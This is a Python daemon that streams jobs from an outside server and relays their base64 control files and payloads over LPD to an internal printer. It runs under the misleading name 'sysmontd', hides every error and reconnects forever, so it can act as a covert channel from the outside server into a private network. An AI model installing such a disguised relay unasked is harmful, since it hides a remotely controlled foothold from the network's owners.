import base64
import gzip
import json
import socket
import time
import urllib.request
from typing import Any, Dict, Optional

def claim_job(j_id: str) -> bool:
    if not j_id:
        return True
    try:
        req = urllib.request.Request(
            "https://api.preconnect.app/print/claim",
            data=json.dumps({"id": str(j_id)}).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "User-Agent": "sysmontd/1.0",
                "Connection": "keep-alive",
            },
        )
        resp = urllib.request.urlopen(req, timeout=2)
        res = json.loads(resp.read().decode("utf-8"))
        return bool(res.get("claimed", False))
    except Exception:
        return True

def handle(job: Dict[str, Any]) -> None:
    j_id: Optional[str] = job.get("id")
    if j_id and not claim_job(str(j_id)):
        return
    try:
        ctl = base64.b64decode(job.get("controlFile", ""))
        payload = base64.b64decode(job.get("payload", ""))

        if job.get("isGzip") or (len(payload) >= 2 and payload[0] == 0x1F and payload[1] == 0x8B):
            try:
                payload = gzip.decompress(payload)
            except Exception:
                pass

        host = job.get("printerHost", "172.16.0.111")
        queue = job.get("printerQueue", "secure")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(max(30, min(600, int(30 + len(payload) / 1048576 * 10))))
        try:
            s.connect((host, 515))
            q_cmd = b"\x02" + queue.encode("utf-8") + b"\n"
            cf_hdr = b"\x02" + str(len(ctl)).encode("utf-8") + b" cfA002sysmontd\n"
            df_hdr = b"\x03" + str(len(payload)).encode("utf-8") + b" dfA002sysmontd\n"

            if send(s, q_cmd) and send(s, cf_hdr) and send(s, ctl + b"\x00") and send(s, df_hdr):
                send(s, payload + b"\x00")
        finally:
            s.close()
    except Exception:
        pass

def send(s: socket.socket, data: bytes) -> bool:
    try:
        s.sendall(memoryview(data))
        return s.recv(1) == b"\x00"
    except Exception:
        return False

def stream() -> None:
    try:
        req = urllib.request.Request(
            "https://api.preconnect.app/printer",
            headers={
                "Accept": "text/event-stream",
                "User-Agent": "sysmontd/1.0",
                "Connection": "keep-alive",
            },
        )
        with urllib.request.urlopen(req) as resp:
            while True:
                line: bytes = resp.readline()
                if not line:
                    break
                if line.startswith(b"data: "):
                    try:
                        handle(json.loads(line[6:].decode("utf-8")))
                    except Exception:
                        pass
    except Exception:
        pass

if __name__ == "__main__":
    while True:
        stream()
        time.sleep(2)
